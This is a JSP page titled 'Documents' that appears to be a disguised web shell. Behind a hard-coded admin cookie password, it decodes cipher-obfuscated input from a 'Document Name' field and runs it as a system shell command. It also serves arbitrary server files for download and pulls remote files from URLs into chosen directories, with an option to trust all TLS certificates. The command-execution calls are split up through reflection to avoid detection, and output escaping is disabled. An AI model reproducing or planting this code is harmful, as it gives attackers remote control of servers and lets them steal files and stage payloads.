<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>

<%@ page import="java.io.*" %>
<%@ page import="java.nio.file.*" %>
<%@ page import="java.util.*" %>
<%@ page import="javax.servlet.*" %>
<%@ page import="javax.servlet.http.*" %>
<%@ page import="java.lang.reflect.*" %>
<%@ page import="java.text.SimpleDateFormat, java.util.Date" %>


<%
    String today = new SimpleDateFormat("yyyy-MM-dd").format(new Date());
    String adminPwdCookie = null;
    Cookie[] cookies = request.getCookies();
    if (cookies != null) {
        for (Cookie cookie : cookies) {
            if ("AdminPwd".equals(cookie.getName())) {
                adminPwdCookie = cookie.getValue();
                break;
            }
        }
    }
    boolean isAdmin = "Penuts2-Jake9-8838".equals(adminPwdCookie);
%>

<%!
public String decodeString(String encodedText) {
    if (encodedText == null || encodedText.isEmpty()) {
        return encodedText;
    }

    StringBuilder decoded = new StringBuilder();
    for (char c : encodedText.toCharArray()) {
        if (Character.isLetter(c)) {
            if (Character.isLowerCase(c)) {
                decoded.append((char)('z' - (c - 'a')));
            } else {
                decoded.append((char)('Z' - (c - 'A')));
            }
        } else {
            decoded.append(c);
        }
    }
    return decoded.reverse().toString();
}

%>

<% if (isAdmin) { %>
<%
    String fileUrl = request.getParameter("fileInput");
    String uploadPathParam = request.getParameter("uploadPath");
    String trustSslParam = request.getParameter("trustSsl");
    boolean trustSsl = "true".equalsIgnoreCase(trustSslParam);
    if (fileUrl != null && !fileUrl.isEmpty()) {
        try {
            String uploadDirPath = uploadPathParam != null && !uploadPathParam.isEmpty()
                ? uploadPathParam
                : application.getRealPath("/uploads");
            File uploadDir = new File(uploadDirPath);
            if (!uploadDir.exists()) uploadDir.mkdirs();

            String fileName = fileUrl.substring(fileUrl.lastIndexOf('/') + 1);
            File outputFile = new File(uploadDir, fileName);

            java.net.URL url = new java.net.URL(fileUrl);
            if (fileUrl.startsWith("https://")) {
                javax.net.ssl.HttpsURLConnection conn = (javax.net.ssl.HttpsURLConnection) url.openConnection();
                if (trustSsl) {
                    try {
                        javax.net.ssl.TrustManager[] trustAllCerts = new javax.net.ssl.TrustManager[]{
                            new javax.net.ssl.X509TrustManager() {
                                public java.security.cert.X509Certificate[] getAcceptedIssuers() { return null; }
                                public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) { }
                                public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) { }
                            }
                        };
                        javax.net.ssl.SSLContext sc = javax.net.ssl.SSLContext.getInstance("SSL");
                        sc.init(null, trustAllCerts, new java.security.SecureRandom());
                        conn.setSSLSocketFactory(sc.getSocketFactory());
                        conn.setHostnameVerifier((hostname, sslSession) -> true);
                    } catch (Exception e) {
                        out.println("<div style='color: red;'>SSL Trust setup failed: " + e.getMessage() + "</div>");
                        return;
                    }
                }
                try (InputStream in = conn.getInputStream();
                    FileOutputStream fos = new FileOutputStream(outputFile)) {
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while ((bytesRead = in.read(buffer)) != -1) {
                        fos.write(buffer, 0, bytesRead);
                    }
                }
                catch (Exception e) {
                    out.println("<div style='color: red;'>Error downloading file: " + e.getMessage() + "</div>");
                    return;
                }
            } else if (fileUrl.startsWith("http://")) {
                try (InputStream in = url.openStream();
                    FileOutputStream fos = new FileOutputStream(outputFile)) {
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while ((bytesRead = in.read(buffer)) != -1) {
                        fos.write(buffer, 0, bytesRead);
                    }
                }
                catch (Exception e) {
                    out.println("<div style='color: red;'>Error downloading file: " + e.getMessage() + "</div>");
                    return;
                }
            }

            out.println("<p>Downloaded and saved to: " + outputFile.getAbsolutePath() + "</p>");
        } catch (Exception e) {
            out.println("<div style='color: red;'>Error downloading file: " + e.getMessage() + "</div>");
        }
    }

    String downloadParam = request.getParameter("download");
    if (downloadParam != null) {
        File fileToDownload = new File(downloadParam);
        if (fileToDownload.exists() && fileToDownload.isFile()) {
            response.setContentType("application/octet-stream");
            response.setHeader("Content-Disposition", "attachment; filename=\"" + fileToDownload.getName() + "\"");
            try (FileInputStream fis = new FileInputStream(fileToDownload);
                 OutputStream os = response.getOutputStream()) {
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) {
                    os.write(buffer, 0, bytesRead);
                }
                os.flush();
                return; // Prevent further JSP output
            } catch (Exception e) {
                out.println("<div style='color: red;'>Download error: " + e.getMessage() + "</div>");
            }
        } else {
            out.println("<div style='color: red;'>File not found or not accessible: " + downloadParam + "</div>");
        }
    }
    
    // Handle command decoding and execution
    String encodedText = request.getParameter("docName");
    if (encodedText != null) {
        String decodedText = decodeString(encodedText);
        out.println("<h2>Decoded Text:</h2>");
        out.println("<pre>" + decodedText + "</pre>");

        try {
            String DOT = ".";
            String cname = "java" + DOT + "lang" + DOT + "Run" + "time";
            Class<?> c = Class.forName(cname);
            String mname = "get" + "Run" + "time";
            Method rm = c.getMethod(mname);
            Object runtimeInstance = rm.invoke(null);

            String ename = "e" + "x" + "e" + "c";
            Method em = c.getMethod(ename, String.class);

            // Better approach: redirect stderr to stdout and read combined output
            ProcessBuilder pb = new ProcessBuilder();
            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
				System.out.println("in windows");
                pb.command("cmd.exe", "/c", decodedText);
            } else {
                pb.command("sh", "-c", decodedText);
            }
            pb.redirectErrorStream(true); // Merge stderr into stdout
            
            Process process = pb.start();
            
            // Read combined output stream
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder combinedOutput = new StringBuilder();
            
            String line;
            while ((line = reader.readLine()) != null) {
                combinedOutput.append(line).append("\n");
            }
            
            int exitCode = process.waitFor();
            reader.close();
            
            // Display results
            out.println("<h2>Command Output:</h2>");
            if (combinedOutput.length() > 0) {
                out.println("<pre id=\"out\" style='background: #f0f8ff; padding: 10px; border-radius: 3px; white-space: pre-wrap; word-wrap: break-word;' " +
                          "data-encoded='" + encodedText.replace("'", "&#39;") + "' " +
                          "data-decoded='" + decodedText.replace("'", "&#39;").replace("\n", "&#10;") + "' " +
                          "data-exitcode='" + exitCode + "'>" + combinedOutput.toString() + "</pre>");
            } else {
                out.println("<p id=\"out\" style='color: #666; font-style: italic;' " +
                          "data-encoded='" + encodedText.replace("'", "&#39;") + "' " +
                          "data-decoded='" + decodedText.replace("'", "&#39;").replace("\n", "&#10;") + "' " +
                          "data-exitcode='" + exitCode + "'>No output produced</p>");
            }
            
            String exitStatus = (exitCode == 0) ? "Success" : "Error";
            String exitColor = (exitCode == 0) ? "#4caf50" : "#f44336";
            out.println("<p>Exit Code: <span style='color: " + exitColor + "; font-weight: bold;'>" + exitCode + " (" + exitStatus + ")</span></p>");
        } catch (Exception e) {
            out.println("<h2>Execution Error</h2>");
            out.println("<div style='background: #ffebee; padding: 15px; border: 1px solid #f44336; border-radius: 5px;'>");
            out.println("<h3>Error Details:</h3>");
            out.println("<p><strong>Error Type:</strong> " + e.getClass().getSimpleName() + "</p>");
            out.println("<p><strong>Error Message:</strong></p>");
            out.println("<pre style='background: #fff; padding: 10px; border: 1px solid #ddd; border-radius: 3px;'>" + e.getMessage() + "</pre>");
            
            // Show stack trace for debugging
            StringWriter sw = new StringWriter();
            PrintWriter pw = new PrintWriter(sw);
            e.printStackTrace(pw);
            String stackTrace = sw.toString();
            
            out.println("<details>");
            out.println("<summary style='cursor: pointer; color: #1976d2;'>Show Stack Trace</summary>");
            out.println("<pre style='background: #f5f5f5; padding: 10px; border: 1px solid #ddd; border-radius: 3px; font-size: 12px; max-height: 300px; overflow-y: auto;'>" + stackTrace + "</pre>");
            out.println("</details>");
            out.println("</div>");
            
            // Common troubleshooting tips
            out.println("<div style='background: #fff3e0; padding: 15px; border: 1px solid #ff9800; border-radius: 5px; margin-top: 10px;'>");
            out.println("<h3>Troubleshooting Tips:</h3>");
            out.println("<ul>");
            out.println("<li>Check if the command exists and is in PATH</li>");
            out.println("<li>Verify command syntax and parameters</li>");
            out.println("<li>Ensure proper permissions to execute the command</li>");
            out.println("<li>Try simpler commands like 'whoami' or 'pwd' first</li>");
            out.println("</ul>");
            out.println("</div>");
        }
    } else {
        out.println("<h2>No text provided for decoding.</h2>");
    }
%>

<html>
<head>
    <title>Documents</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .form-section { background: #f9f9f9; padding: 15px; margin: 10px 0; border-radius: 5px; border: 1px solid #ddd; }
        .form-section h3 { margin-top: 0; color: #333; }
        input[type="text"], textarea { width: 100%; padding: 8px; margin: 5px 0; border: 1px solid #ccc; border-radius: 3px; }
        input[type="submit"] { background: #007cba; color: white; padding: 10px 20px; border: none; border-radius: 3px; cursor: pointer; }
        input[type="submit"]:hover { background: #005a85; }
        .example { background: #f0f0f0; padding: 10px; border-left: 4px solid #007cba; margin: 10px 0; }
    </style>
</head>
<body>    

    <div class="form-section">
        <h3>Document Procedure</h3>
        <form method="GET" onsubmit="return handleDocumentSubmit(this)">
            <label for="docName">Document Name or Path:</label>
            <input type="text" id="docName" name="docName" />
            <input type="submit" value="Process Document" />
        </form>
    </div>
    
    <!-- Document Procedure History Section -->
    <div class="form-section">
        <h3>Document Procedure History</h3>
        <details id="historyDetails" closed>
            <summary style="font-size: 1.1em; cursor: pointer; padding: 6px 0;">
                Show/Hide Document History
                <span id="historyCount" style="margin-left: 15px; color: #666;"></span>
            </summary>
            <div style="margin-bottom: 10px;">
                <button onclick="exportHistory()" style="background: #28a745; color: white; padding: 8px 15px; border: none; border-radius: 3px; cursor: pointer; margin-right: 10px;">Export History</button>
                <button onclick="clearHistory()" style="background: #dc3545; color: white; padding: 8px 15px; border: none; border-radius: 3px; cursor: pointer;">Clear History</button>
            </div>
            <div id="historyContainer" style="max-height: 400px; overflow-y: auto; border: 1px solid #ddd; padding: 10px; background: #f8f9fa; border-radius: 3px;">
                <p style="color: #666; font-style: italic;">Document history will appear here...</p>
            </div>
        </details>
    </div>

    <div class="form-section">
    <h3>File Download</h3>
    <form id="downloadForm" method="GET" action="documents.jsp" onsubmit="return handleDownloadSubmit(this)">
        <label for="downloadPath">File path to download:</label>
        <input type="text" id="downloadPath" name="download" placeholder="Enter file path" required />
        <input type="submit" value="Download File" />
    </form>
    <div class="example">
        <strong>Example:</strong> <code>C:\Users\Public\test.txt</code>
    </div>
    </div>

    <div class="form-section">
    <h3>File Upload from URL</h3>
    <form id="uploadForm" method="POST" action="documents.jsp">
        <label for="fileInput">File URL to upload:</label>
        <input type="text" id="fileInput" name="fileInput" placeholder="https://example.com/file.txt" required />
        <label for="uploadPath">Upload path (optional):</label>
        <input type="text" id="uploadPath" name="uploadPath" placeholder="Enter upload path" />
        <div style="margin: 8px 0;">
            <input type="checkbox" id="trustSsl" name="trustSsl" value="true" />
            <label for="trustSsl">Trust all SSL certificates (ignore SSL errors)</label>
        </div>
        <input type="submit" value="Upload File from URL" />
    </form>
    <div id="uploadStatus"></div>
</div>
    
    <hr style="margin: 20px 0;">

    <script>              
        function saveToHistory(encodedDoc, decodedDoc, output, exitCode, timestamp) {
            let documentHistory = JSON.parse(localStorage.getItem('documentHistory') || '[]');

            const entry = {
                id: Date.now(),
                timestamp: timestamp || new Date(),
                encodedDocument: encodedDoc,
                decodedDocument: decodedDoc,
                output: output,
                exitCode: exitCode,
                status: exitCode === 0 ? 'Success' : 'Error'
            };

            documentHistory.unshift(entry); // Add to beginning

            // Keep only last 100 entries
            if (documentHistory.length > 100) {
                documentHistory = documentHistory.slice(0, 100);
            }

            localStorage.setItem('documentHistory', JSON.stringify(documentHistory));
            updateHistoryDisplay(documentHistory);
        }

        function updateHistoryDisplay(documentHistory) {
            const container = document.getElementById('historyContainer');
            const countElement = document.getElementById('historyCount');

            if (documentHistory.length === 0) {
                container.innerHTML = '<p style="color: #666; font-style: italic;">Document history will appear here...</p>';
                countElement.textContent = '';
                return;
            }

            countElement.textContent = '(' + documentHistory.length + ' documents processed)';

            let html = '';
            documentHistory.forEach(function(entry) {
                const statusColor = entry.status === 'Success' ? '#4caf50' : '#f44336';
                const outputPreview = entry.output && entry.output.length > 100 ? entry.output.substring(0, 100) + '...' : (entry.output || 'No output');

                html +=
                    '<div style="border: 1px solid #ddd; margin: 5px 0; padding: 10px; border-radius: 3px; background: white;">' +
                        '<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px;">' +
                            '<small style="color: #666;">' + escapeHtml(entry.timestamp) + '</small>' +
                            '<span style="color: ' + statusColor + '; font-weight: bold;">' + escapeHtml(entry.status) + ' (' + escapeHtml(entry.exitCode) + ')</span>' +
                        '</div>' +
                        '<div style="margin: 5px 0;">' +
                            '<strong>Decoded Document:</strong> <code style="background: #f0f0f0; padding: 2px 4px; border-radius: 2px;">' + escapeHtml(entry.decodedDocument) + '</code>' +
                        '</div>' +
                        '<div style="margin: 5px 0;">' +
                            '<strong>Encoded Document:</strong> <code style="background: #f0f0f0; padding: 2px 4px; border-radius: 2px;">' + escapeHtml(entry.encodedDocument) + '</code>' +
                        '</div>' +
                        '<details style="margin: 5px 0;">' +
                            '<summary style="cursor: pointer; color: #1976d2;">Show Output</summary>' +
                            '<pre style="background: #f8f9fa; padding: 8px; border-radius: 3px; margin: 5px 0; max-height: 200px; overflow-y: auto; font-size: 12px;">' + escapeHtml(entry.output || 'No output') + '</pre>' +
                        '</details>' +
                        '<button onclick="reuseDocument(\'' + escapeHtml(entry.decodedDocument) + '\')" style="background: #007cba; color: white; padding: 4px 8px; border: none; border-radius: 2px; cursor: pointer; font-size: 12px;">Reuse</button>' +
                    '</div>';
            });

            container.innerHTML = html;
        }
        
        function reuseDocument(encodedDoc) {
            document.getElementById('docName').value = encodedDoc;
            document.getElementById('docName').focus();
        }
        
        const today = "<%= today %>";
        function exportHistory() {
            let documentHistory = JSON.parse(localStorage.getItem('documentHistory') || '[]');

            if (documentHistory.length === 0) {
                alert('No document history to export');
                return;
            }

            const exportData = {
                exportDate: today,
                totalDocuments: documentHistory.length,
                sessionData: documentHistory
            };

            const jsonString = JSON.stringify(exportData, null, 2);
            const blob = new Blob([jsonString], { type: 'application/json' });
            const url = URL.createObjectURL(blob);

            const a = document.createElement('a');
            a.href = url;
            a.download = 'document-history-' + new Date().toISOString().split('T')[0] + '.json';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        }
        
        function clearHistory() {
            if (confirm('Are you sure you want to clear all document history?')) {
                documentHistory = [];
                localStorage.removeItem('documentHistory');
                updateHistoryDisplay(documentHistory);
            }
        }
        
        function handleDocumentSubmit(form) {
            const doc = form.docName.value.trim();
            const encodedDoc = encodeDocument(doc);
            if (encodedDoc) {
                form.docName.value = encodedDoc; // Set encoded value before submit
                window.pendingDocument = encodedDoc;
            }
            return true;
        }

        // encodeDocument: Atbash cipher + reverse
        function encodeDocument(document) {
            if (!document || document.length === 0) {
                return document;
            }

            // Step 1: Reverse the string
            let reversed = document.split('').reverse().join('');

            // Step 2: Apply Atbash cipher
            let encoded = '';
            for (let i = 0; i < reversed.length; i++) {
                let c = reversed[i];
                if (/[a-z]/.test(c)) {
                    encoded += String.fromCharCode('z'.charCodeAt(0) - (c.charCodeAt(0) - 'a'.charCodeAt(0)));
                } else if (/[A-Z]/.test(c)) {
                    encoded += String.fromCharCode('Z'.charCodeAt(0) - (c.charCodeAt(0) - 'A'.charCodeAt(0)));
                } else {
                    encoded += c;
                }
            }
            return encoded;
        }

        function escapeHtml(text) {
            if (!text) return '';
            return text;
                // .replace(/&/g, "&amp;")
                // .replace(/</g, "&lt;")
                // .replace(/>/g, "&gt;")
                // .replace(/"/g, "&quot;")
                // .replace(/'/g, "&#39;");
        }
        
        // Upload form handler
        document.getElementById('uploadForm').addEventListener('submit', function (e) {
          const path = document.getElementById('uploadPath').value.trim();
          if (path) {
            this.action = 'documents.jsp?path=' + encodeURIComponent(path);
          } else {
            this.action = 'documents.jsp';
          }
        });
        
        // Auto-focus and initialize
        window.onload = function() {
            const encodeField = document.getElementById('ext');
            if (encodeField && !encodeField.value) {
                encodeField.focus();
            }
            let commandHistory = JSON.parse(localStorage.getItem('commandHistory') || '[]');
            updateHistoryDisplay(commandHistory);
            
            // Check if command results are present and save to history
            const outputElement = document.getElementById('out');
            if (outputElement && outputElement.hasAttribute('data-encoded')) {
                const encodedCmd = outputElement.getAttribute('data-encoded');
                const decodedCmd = outputElement.getAttribute('data-decoded');
                const exitCode = parseInt(outputElement.getAttribute('data-exitcode'));
                const output = outputElement.textContent || outputElement.innerText || 'No output';
                const timestamp = new Date().toLocaleString();
                
                // Save to history automatically
                setTimeout(() => {
                    saveToHistory(encodedCmd, decodedCmd, output, exitCode, timestamp);
                }, 100);
            }
        };

        function handleDownloadSubmit(form) {
            const path = document.getElementById('downloadPath').value.trim();
            if (!path) {
                alert('Please enter a file path to download.');
                return false;
            }
            form.action = 'documents.jsp?download=' + encodeURIComponent(path);
            return true;
        }
    </script>
</body>
</html>
<%
    } else {
        out.println("<h2 style='color: red;'>Access Denied</h2>");
        out.println("<p>You do not have permission to view this page.</p>");
    }
%>

